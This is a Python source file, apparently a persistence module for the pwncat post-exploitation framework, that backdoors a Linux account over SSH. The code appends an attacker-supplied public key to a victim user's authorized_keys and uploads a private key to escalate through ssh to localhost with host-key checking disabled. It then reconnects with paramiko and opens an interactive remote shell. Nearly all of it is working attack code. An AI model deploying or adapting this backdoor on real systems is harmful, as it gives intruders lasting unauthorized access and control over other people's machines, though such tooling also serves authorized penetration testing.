#!/usr/bin/env python3
import os
import shutil
import socket

import paramiko
from prompt_toolkit import prompt

import pwncat
import pwncat.tamper
from pwncat.util import Access
from pwncat.modules import Argument, PersistType, PersistError
from pwncat.platform.linux import Linux
from pwncat.modules.agnostic.persist import PersistModule


class Module(PersistModule):
    """
    Install the custom backdoor key-pair as an authorized key for
    the specified user. This method only succeeds for a user other
    than the current user if you are currently root.
    """

    # We can escalate locally with `ssh localhost`
    TYPE = PersistType.LOCAL | PersistType.REMOTE
    PLATFORM = [Linux]
    ARGUMENTS = {
        **PersistModule.ARGUMENTS,
        "backdoor_key": Argument(
            str, help="Path to a private/public key pair to install"
        ),
    }

    def install(self, user, backdoor_key):
        """ Install this persistence method """

        homedir = pwncat.victim.users[user].homedir
        if not homedir or homedir == "":
            raise PersistError("no home directory")

        # Create .ssh directory if it doesn't exist
        access = pwncat.victim.access(os.path.join(homedir, ".ssh"))
        if Access.DIRECTORY not in access or Access.EXISTS not in access:
            pwncat.victim.run(["mkdir", "-p", os.path.join(homedir, ".ssh")])

        # Create the authorized_keys file if it doesn't exist
        access = pwncat.victim.access(os.path.join(homedir, ".ssh", "authorized_keys"))
        if Access.EXISTS not in access:
            pwncat.victim.run(
                ["touch", os.path.join(homedir, ".ssh", "authorized_keys")]
            )
            pwncat.victim.run(
                ["chmod", "600", os.path.join(homedir, ".ssh", "authorized_keys")]
            )
            authkeys = []
        else:
            try:
                # Read in the current authorized keys if it exists
                with pwncat.victim.open(
                    os.path.join(homedir, ".ssh", "authorized_keys"), "r"
                ) as filp:
                    authkeys = filp.readlines()
            except (FileNotFoundError, PermissionError) as exc:
                raise PersistError(str(exc))

        try:
            # Read our public key
            with open(backdoor_key + ".pub", "r") as filp:
                pubkey = filp.readlines()
        except (FileNotFoundError, PermissionError) as exc:
            raise PersistError(str(exc))

        # Ensure we read a public key
        if not pubkey:
            raise PersistError(f"{pwncat.config['privkey']+'.pub'}: empty public key")

        # Add our public key
        authkeys.extend(pubkey)
        authkey_data = "".join(authkeys)

        # Write the authorized keys back to the authorized keys
        try:
            with pwncat.victim.open(
                os.path.join(homedir, ".ssh", "authorized_keys"),
                "w",
                length=len(authkey_data),
            ) as filp:
                filp.write(authkey_data)
        except (FileNotFoundError, PermissionError) as exc:
            raise PersistError(str(exc))

        # Ensure we have correct permissions for ssh to work properly
        pwncat.victim.env(
            ["chmod", "600", os.path.join(homedir, ".ssh", "authorized_keys")]
        )
        pwncat.victim.env(
            [
                "chown",
                f"{user}:{user}",
                os.path.join(homedir, ".ssh", "authorized_keys"),
            ]
        )

        # Register the modifications with the tamper module
        pwncat.tamper.modified_file(
            os.path.join(homedir, ".ssh", "authorized_keys"), added_lines=pubkey
        )

    def remove(self, user, backdoor_key):
        """ Remove this persistence method """

        try:
            # Read our public key
            with open(backdoor_key + ".pub", "r") as filp:
                pubkey = filp.readlines()
        except (FileNotFoundError, PermissionError) as exc:
            raise PersistError(str(exc))

        # Find the user's home directory
        homedir = pwncat.victim.users[user].homedir
        if not homedir or homedir == "":
            raise PersistError("no home directory")

        # Remove the tamper tracking
        for tamper in pwncat.tamper.filter(pwncat.tamper.ModifiedFile):
            if (
                tamper.path == os.path.join(homedir, ".ssh", "authorized_keys")
                and tamper.added_lines == pubkey
            ):
                try:
                    # Attempt to revert our changes
                    tamper.revert()
                except pwncat.tamper.RevertFailed as exc:
                    raise PersistError(str(exc))
                # Remove the tamper tracker
                pwncat.tamper.remove(tamper)
                break
        else:
            raise PersistError("failed to find matching tamper")

    def escalate(self, user, backdoor_key):
        """ Locally escalate to the given user with this method """

        try:
            # Ensure there is an SSH server
            sshd = pwncat.victim.find_service("sshd")
        except ValueError:
            return False

        # Ensure it is running
        if not sshd.running:
            return False

        # Upload the private key
        with pwncat.victim.tempfile("w", length=os.path.getsize(backdoor_key)) as dst:
            with open(backdoor_key, "r") as src:
                shutil.copyfileobj(src, dst)

            privkey_path = dst.name

        # Ensure correct permissions
        try:
            pwncat.victim.env(["chmod", "600", privkey_path])
        except FileNotFoundError:
            # We don't have chmod :( this probably won't work, but
            # we can try it.
            pass

        # Run SSH, disabling password authentication to force public key
        # Don't wait for the result, because this won't exit
        pwncat.victim.env(
            [
                "ssh",
                "-i",
                privkey_path,
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "PasswordAuthentication=no",
                f"{user}@localhost",
            ],
            wait=False,
        )

        # Delete the private key. This either worked and we didn't need it
        # or it didn't work and we still don't need it.
        try:
            pwncat.victim.env(["rm", "-f", privkey_path])
        except FileNotFoundError:
            # File removal failed because `rm` doesn't exist. Register it as a tamper.
            pwncat.tamper.created_file(privkey_path)

        return True

    def connect(
        self, host: pwncat.db.Host, user, backdoor_key: str
    ) -> socket.SocketType:
        """ Reconnect to this host with this persistence method """

        try:
            # Connect to the remote host's ssh server
            sock = socket.create_connection((host.ip, 22))
        except Exception as exc:
            raise PersistError(str(exc))

        # Create a paramiko SSH transport layer around the socket
        t = paramiko.Transport(sock)
        try:
            t.start_client()
        except paramiko.SSHException:
            raise PersistError("ssh negotiation failed")

        try:
            # Load the private key for the user
            key = paramiko.RSAKey.from_private_key_file(backdoor_key)
        except:
            password = prompt("RSA Private Key Passphrase: ", is_password=True)
            key = paramiko.RSAKey.from_private_key_file(backdoor_key, password)

        # Attempt authentication
        try:
            t.auth_publickey(user, key)
        except paramiko.ssh_exception.AuthenticationException:
            raise PersistError("authorized key authentication failed")

        if not t.is_authenticated():
            t.close()
            sock.close()
            raise PersistError("authorized key authentication failed")

        # Open an interactive session
        chan = t.open_session()
        chan.get_pty()
        chan.invoke_shell()

        return chan
